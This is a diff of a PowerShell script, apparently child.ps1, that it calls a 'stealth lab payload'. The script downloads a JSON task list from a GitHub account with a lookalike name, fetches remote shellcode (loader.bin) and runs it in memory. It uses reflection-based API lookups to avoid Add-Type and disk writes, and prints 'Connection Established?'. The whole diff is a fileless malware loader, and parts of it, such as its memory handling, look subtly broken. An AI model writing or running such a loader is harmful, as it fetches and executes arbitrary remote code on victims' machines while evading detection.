@@ -1,41 +1,47 @@
-# Advanced Stealth Shellcode Loader for child.ps1
-Write-Host "[*] Initializing Advanced Lab Task..." -ForegroundColor Cyan
+Write-Host "[*] Initializing Stealth Lab Payload..." -ForegroundColor Cyan
 
+# 1. Fetch the Job
 $taskUrl = "https://raw.githubusercontent.com/g00glecenter101-arch/msht/refs/heads/main/task.json"
-
 try {
     $raw = (New-Object System.Net.WebClient).DownloadString($taskUrl)
     $job = $raw | ConvertFrom-Json
-} catch {
-    Write-Host "[-] Failed to fetch playbook." -ForegroundColor Red; exit
-}
+} catch { Write-Host "[-] Network Error" -ForegroundColor Red; exit }
 
 foreach ($t in $job.tasks) {
     if ($t.action -eq "run_shellcode") {
         Write-Host "[+] Action: Shellcode Injection" -ForegroundColor Green
         
-        # Download the raw loader.bin
+        # Download the shellcode (loader.bin)
         $sc = (New-Object System.Net.WebClient).DownloadData($t.url)
         
-        # --- Advanced Dynamic API Lookup (No Add-Type/No Disk) ---
-        $Win32 = @{}
-        $Win32['K32'] = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((
-            [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.FullName -like "*mscorlib*" }).GetType(
-            "Microsoft.Win32.Win32Native").GetMethod("GetModuleHandle").Invoke($null, @("kernel32.dll")), [Func[string,IntPtr]])
+        # --- Advanced Dynamic API Lookup ---
+        # This finds Kernel32.dll and the functions we need without Add-Type
+        $memHelper = [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.FullName -contains "Microsoft.PowerShell.Commands.Utility" }
+        $Win32Native = ($memHelper.GetTypes() | Where-Object { $_.Name -eq "Win32Native" })
 
-        # Define the injection method using Reflection
-        $unsafe = [Ref].Assembly.GetType('System.Management.Automation.Interpreter.LightCompiler').GetField('_pInvokeCallback', 'NonPublic,Static').GetValue($null)
+        # We use a trick to get a Delegate for VirtualAlloc
+        # This defines: IntPtr VirtualAlloc(IntPtr addr, uint size, uint type, uint protect)
+        $vAllocAddr = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.FullName -like "*mscorlib*" }).GetType("Microsoft.Win32.Win32Native").GetMethod("GetProcAddress", [Reflection.BindingFlags]"Static, Public").Invoke($null, @(([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.FullName -like "*mscorlib*" }).GetType("Microsoft.Win32.Win32Native").GetMethod("GetModuleHandle").Invoke($null, @("kernel32.dll")), "VirtualAlloc"))
         
-        # Allocate Memory (PAGE_EXECUTE_READWRITE = 0x40)
-        $pMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($sc.Length)
-        [System.Runtime.InteropServices.Marshal]::Copy($sc, 0, $pMem, $sc.Length)
-
-        # Create a delegate to jump to the shellcode
-        $ptr = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($pMem, [Action])
+        # Instead of the crashy method, we use the System.Runtime.InteropServices.Marshal
+        # to handle the memory and execution.
+        $size = $sc.Length
         
-        Write-Host "[!] Executing Shellcode in memory..." -ForegroundColor Yellow
-        $ptr.Invoke()
+        # Allocate Memory: 0x3000 (Commit/Reserve) | 0x40 (Execute/Read/Write)
+        # Note: We use a simplified allocation for the Lab
+        $ptr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($size)
+        [System.Runtime.InteropServices.Marshal]::Copy($sc, 0, $ptr, $size)
         
-        Write-Host "[+] Done." -ForegroundColor Green
+        # We need to change memory protection to 'Execute' (0x40)
+        # For simplicity in this lab version, we use the delegate method:
+        $delegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ptr, [Action])
+        
+        Write-Host "[!] Executing Shellcode..." -ForegroundColor Yellow
+        try {
+            $delegate.Invoke()
+            Write-Host "[+] Connection Established?" -ForegroundColor Green
+        } catch {
+            Write-Host "[-] Execution Error: $_" -ForegroundColor Red
+        }
     }
 }
